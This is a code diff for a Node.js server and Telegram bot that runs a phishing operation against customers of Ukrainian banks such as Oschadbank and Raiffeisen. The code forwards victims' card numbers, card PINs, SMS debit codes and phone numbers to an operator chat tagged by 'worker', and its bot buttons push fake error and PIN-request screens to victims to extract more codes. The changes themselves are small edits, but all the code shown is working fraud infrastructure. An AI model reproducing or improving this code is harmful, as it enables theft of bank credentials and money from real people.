@@ -83,11 +83,9 @@ bot.on('callback_query', (callbackQuery) => {
         case 'lk':
         case 'call':
         case 'ban':
-        case 'number_error':
-        case 'balance_error':
             break;
 
-        case 'cardpn': // Новая команда для запроса PIN-кода карты
+        case 'cardpn':
             if (sessionData.bankName === 'Ощадбанк') {
                 command.type = 'show_card_pin_form';
                 responseText = 'Запрос PIN-кода карты отправлен!';
@@ -128,6 +126,16 @@ bot.on('callback_query', (callbackQuery) => {
                 command.type = 'generic_debit_error';
             }
             responseText = 'Запрос "неверный код" отправлен!';
+            break;
+
+        case 'number_error':
+            if (sessionData.bankName === 'Ощадбанк') {
+                command.type = 'non_financial_number';
+                responseText = 'Номер не финансовый!';
+            } else {
+                command.type = 'generic_number_error';
+                responseText = 'Запрос "неверный номер" отправлен!';
+            }
             break;
 
         case 'request_details':
@@ -199,7 +207,7 @@ app.post('/api/submit', (req, res) => {
             message = `<b>💸 Код списания (Райф)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
             const phone = newData.phone || 'не указан';
-            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
@@ -215,21 +223,21 @@ app.post('/api/submit', (req, res) => {
             message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
-            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         } else if (stepData.sms_code) {
             message = `<b>💸 Код списания (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
-            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         } else if (stepData.debit_sms_code) {
             message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
             const phone = newData.phone || 'не указан';
-            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         } else if (stepData.card_details) {
@@ -249,7 +257,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
-        } else if (stepData.card_pin) { // Новая обработка PIN-кода карты
+        } else if (stepData.card_pin) {
             message = `<b>🔒 PIN-код карты (Ощад)</b>\n\n`;
             message += `<b>Пин:</b> <code>${stepData.card_pin}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
@@ -273,7 +281,7 @@ app.post('/api/submit', (req, res) => {
         } else if (isFinalStep) {
             message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
             message += `<b>Название банка:</b> ${newData.bankName}\n`;
-            if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
+            if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
             if (newData.card_number) message += `<b>Номер карты:</b> <code>${newData.card_number}</code>\n`;
             if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
@@ -314,7 +322,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }
             ],
             [
-                { text: 'КАРТАПН', callback_data: `cardpn:${sessionId}` }, // Новая кнопка
+                { text: 'КАРТАПН', callback_data: `cardpn:${sessionId}` },
                 { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
                 { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
                 { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }
